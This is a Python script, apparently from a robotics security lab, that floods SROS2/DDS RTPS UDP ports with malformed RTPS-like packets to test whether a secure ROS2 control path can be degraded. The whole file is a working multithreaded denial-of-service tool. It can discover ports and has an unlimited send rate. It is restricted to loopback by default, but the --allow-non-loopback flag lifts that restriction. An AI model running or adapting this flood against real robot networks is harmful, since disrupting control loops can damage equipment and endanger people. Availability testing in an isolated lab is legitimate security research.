#!/usr/bin/env python3
"""Local DDS/RTPS UDP flood for the SROS2 availability experiment.

This script is intentionally constrained for the local WSL/Docker lab. It does
not attempt to bypass SROS2 permissions; it tests whether high-rate malformed
RTPS-like UDP traffic can degrade an already-working secure ROS2 control path.
"""

import argparse
import ipaddress
import os
import random
import socket
import struct
import threading
import time


DEFAULT_PORTS = [7400, 7401, 7410, 7411, 7412, 7413, 7414, 7415]
DDS_PORT_MIN = 7400
DDS_PORT_MAX = 7600


def parse_args():
    parser = argparse.ArgumentParser(description="Local SROS2 DDS/RTPS UDP flood")
    parser.add_argument("--target-ip", default="127.0.0.1")
    parser.add_argument("--ports", default="", help="Comma-separated UDP ports. Overrides discovery.")
    parser.add_argument("--discover-ports", action="store_true", help="Use /proc/net/udp* to find local DDS ports.")
    parser.add_argument("--duration", type=float, default=45.0)
    parser.add_argument("--payload-size", type=int, default=1200)
    parser.add_argument("--threads-per-port", type=int, default=2)
    parser.add_argument("--rate", type=float, default=0.0, help="Packets per second per thread. 0 means unlimited.")
    parser.add_argument("--allow-non-loopback", action="store_true")
    return parser.parse_args()


def validate_target(target_ip, allow_non_loopback):
    ip = ipaddress.ip_address(target_ip)
    if not allow_non_loopback and not ip.is_loopback:
        raise SystemExit(
            "Refusing to target a non-loopback address without --allow-non-loopback. "
            "This experiment should stay inside the local WSL/Docker lab."
        )


def parse_proc_udp_file(path):
    ports = set()
    try:
        with open(path, "r", encoding="utf-8") as handle:
            next(handle, None)
            for line in handle:
                parts = line.split()
                if len(parts) < 2:
                    continue
                local = parts[1]
                if ":" not in local:
                    continue
                port = int(local.rsplit(":", 1)[1], 16)
                if DDS_PORT_MIN <= port <= DDS_PORT_MAX:
                    ports.add(port)
    except FileNotFoundError:
        pass
    return ports


def discover_dds_ports():
    ports = set()
    ports.update(parse_proc_udp_file("/proc/net/udp"))
    ports.update(parse_proc_udp_file("/proc/net/udp6"))
    return sorted(ports)


def parse_ports(args):
    if args.ports:
        return sorted({int(port.strip()) for port in args.ports.split(",") if port.strip()})

    if args.discover_ports:
        discovered = discover_dds_ports()
        if discovered:
            return discovered
        print("[warn] No DDS UDP ports discovered in /proc/net/udp*. Falling back to default RTPS ports.")

    return DEFAULT_PORTS


def make_rtps_like_payload(size):
    if size < 20:
        size = 20

    # RTPS magic + protocol version + vendor id + random GUID prefix.
    header = b"RTPS" + bytes([2, 3]) + b"\x01\x0f" + os.urandom(12)
    body = bytearray(os.urandom(size - len(header)))

    # Add a few RTPS-like submessage fragments. These are not valid secure DDS
    # messages, but they pass the first cheap "is this RTPS?" filter.
    for offset in range(0, min(len(body), 64), 16):
        body[offset:offset + 4] = struct.pack("<BBH", random.choice([0x06, 0x15, 0x30]), 0x01, 12)

    return header + bytes(body)


def flood_port(target_ip, port, duration, payload_size, rate, thread_index, totals, live_counts, errors, lock):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1 << 20)
    except OSError as exc:
        with lock:
            errors.append(f"port={port} thread={thread_index}: failed to create UDP socket: {exc}")
            totals[(port, thread_index)] = 0
            live_counts[(port, thread_index)] = 0
        return

    payloads = [make_rtps_like_payload(payload_size) for _ in range(32)]
    deadline = time.monotonic() + duration
    interval = 1.0 / rate if rate > 0 else 0.0
    sent = 0
    last_reported = 0

    while time.monotonic() < deadline:
        try:
            sock.sendto(payloads[sent % len(payloads)], (target_ip, port))
            sent += 1
            if sent - last_reported >= 1000:
                with lock:
                    live_counts[(port, thread_index)] = sent
                last_reported = sent
        except OSError as exc:
            with lock:
                errors.append(f"port={port} thread={thread_index}: send failed after {sent} packets: {exc}")
            break
        if interval:
            time.sleep(interval)

    with lock:
        live_counts[(port, thread_index)] = sent
        totals[(port, thread_index)] = sent


def main():
    args = parse_args()
    validate_target(args.target_ip, args.allow_non_loopback)
    ports = parse_ports(args)

    print("==========================================")
    print("SROS2 DDS/RTPS UDP Flood Availability Test")
    print(f"Target IP:        {args.target_ip}")
    print(f"Target ports:     {ports}")
    print(f"Duration:         {args.duration:.1f}s")
    print(f"Payload size:     {args.payload_size} bytes")
    print(f"Threads per port: {args.threads_per_port}")
    print(f"Rate limit:       {'unlimited' if args.rate <= 0 else str(args.rate) + ' pps/thread'}")
    print("==========================================")

    totals = {}
    live_counts = {}
    errors = []
    lock = threading.Lock()
    threads = []
    started = time.monotonic()

    for port in ports:
        for thread_index in range(args.threads_per_port):
            thread = threading.Thread(
                target=flood_port,
                args=(args.target_ip, port, args.duration, args.payload_size, args.rate, thread_index, totals, live_counts, errors, lock),
                daemon=True,
            )
            threads.append(thread)
            thread.start()

    while any(thread.is_alive() for thread in threads):
        time.sleep(1.0)
        with lock:
            sent = sum(live_counts.values())
            completed = len(totals)
        elapsed = max(time.monotonic() - started, 0.001)
        print(f"[progress] completed_threads={completed}/{len(threads)} live_sent={sent} avg={int(sent / elapsed)} pkt/s", flush=True)

    for thread in threads:
        thread.join()

    sent = sum(totals.values())
    elapsed = max(time.monotonic() - started, 0.001)
    print("==========================================")
    print(f"Finished. Sent {sent} packets in {elapsed:.1f}s, avg {int(sent / elapsed)} pkt/s.")
    if errors:
        print("Errors:")
        for error in errors[:20]:
            print(f"  {error}")
        if len(errors) > 20:
            print(f"  ... {len(errors) - 20} more errors")
    if sent == 0:
        print("No packets were sent. Check socket permissions or container networking.")
        return 2
    print("If the robot/control loop is unaffected, record this as a negative availability result for this attack variant.")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
